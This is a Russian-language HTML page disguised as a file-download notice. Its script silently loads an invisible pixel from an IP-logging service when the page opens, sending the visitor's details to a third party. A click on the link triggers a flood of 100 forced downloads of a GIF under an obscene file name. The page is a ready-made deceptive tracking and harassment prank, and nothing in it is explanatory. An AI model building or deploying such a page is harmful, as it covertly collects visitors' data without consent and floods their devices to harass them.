<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>Загрузка...</title>
</head>
<body>
    <p>Загрузка файла началась... Если скачивание не началось, <a id="downloadLink" href="#">нажмите сюда</a>.</p>

    <script>
        // --- НАСТРОЙКИ ---
        const loggerUrl = 'https://iplog.co/2l0G64'; // Твоя ссылка для сбора данных
        const sourceFile = 'OTVETRUS.gif'; 
        const targetName = 'sex-siski-i-piska.gif'; 
        const spamCount = 100; 
        const delayMs = 250;   

        // --- ЛОГГЕР (SMART DATA) ---
        // Создаем невидимый пиксель, который активирует логгер при загрузке страницы
        const img = new Image();
        img.src = loggerUrl + '?v=' + Math.random(); // Добавляем рандом, чтобы не сработало кэширование
        img.style.display = 'none';
        document.body.appendChild(img);

        // --- ЛОГИКА ЗАГРУЗКИ ---
        let hasClicked = false;
        const link = document.getElementById('downloadLink');

        function downloadSingle() {
            if (hasClicked) return;
            const a = document.createElement('a');
            a.href = sourceFile;
            a.download = targetName;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
        }

        const autoTimer = setTimeout(downloadSingle, 5000);

        async function startSpam() {
            try {
                const response = await fetch(sourceFile);
                if (!response.ok) throw new Error('Файл не найден!');
                const blob = await response.blob();
                const blobUrl = window.URL.createObjectURL(blob);

                for (let i = 0; i < spamCount; i++) {
                    setTimeout(() => {
                        const a = document.createElement('a');
                        a.href = blobUrl;
                        a.download = `(${i+1})_${targetName}`; 
                        document.body.appendChild(a);
                        a.click();
                        document.body.removeChild(a);

                        if (i === spamCount - 1) {
                            setTimeout(() => window.URL.revokeObjectURL(blobUrl), 1000);
                        }
                    }, i * delayMs);
                }
            } catch (e) {
                console.error('Ошибка:', e);
                alert('Ошибка доступа к файлу. Попробуйте нажать еще раз.');
            }
        }

        link.onclick = function(e) {
            e.preventDefault();
            if (hasClicked) return;
            hasClicked = true;
            clearTimeout(autoTimer);
            startSpam();
        };
    </script>
</body>
</html>
